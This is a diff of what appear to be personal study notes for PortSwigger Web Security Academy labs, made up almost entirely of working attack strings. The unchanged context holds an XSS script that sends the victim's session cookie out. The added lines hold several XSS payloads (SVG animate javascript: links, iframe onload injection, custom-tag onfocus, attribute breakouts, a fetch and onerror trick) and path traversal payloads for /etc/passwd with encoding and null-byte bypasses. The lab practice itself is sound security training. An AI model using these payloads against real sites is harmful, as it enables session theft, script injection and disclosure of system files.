@@ -32,6 +32,10 @@
     changeReq.send('csrf=DcMgZTERMXuFkOcuiPGwn7puJMPugU1E&postId=10&comment='+document.cookie.match(/session=(\w+)/)[1]+'&name=a&email=a@gmail.com&website=')
 </script>
 
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+<iframe src="https://0a9d00ea0479b5a5c0f05b2b007a00e0.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
 document.URL
 document.documentURI
 document.URLUnencoded
@@ -46,3 +50,46 @@ localStorage
 sessionStorage
 IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
 Database
+
+innerHTML: "\n                    <script src=\"resources/js/loadCommentsWithVulnerableEscapeHtml.js\"></script>\n                    <script>loadComments('/post/comment')</script>\n                    "
+innerText: ""
+
+outerHTML: "<span id=\"user-comments\">\n                    <script src=\"resources/js/loadCommentsWithVulnerableEscapeHtml.js\"></script>\n                    <script>loadComments('/post/comment')</script>\n                    </span>"
+outerText: ""
+
+location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+
+<script>
+    location = 'https://0a4b008d04c0e776c0425af200630019.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'
+</script>
+
+<xss id="x" onfocus=alert(1) tabindex=1>#x
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+
+    https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+
+
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+test"  autofocus onfocus="alert(1);" value="
+
+href=javascript:alert(1)
+
+<a href="javascript:fetch('/analytics', {
+	method:'
+	post',
+	body:'/post?postId=5&'},
+	x=x=>{
+		throw/**/onerror=alert,xxx},
+		toString=x,window '',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
+
+        /etc/passwd
+
+
+..%252f..%252f..%252fetc/passwd
+....//....//....//etc/passwd
+etc/passwd
+../../../
+filename=../../../etc/passwd%00.png
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png
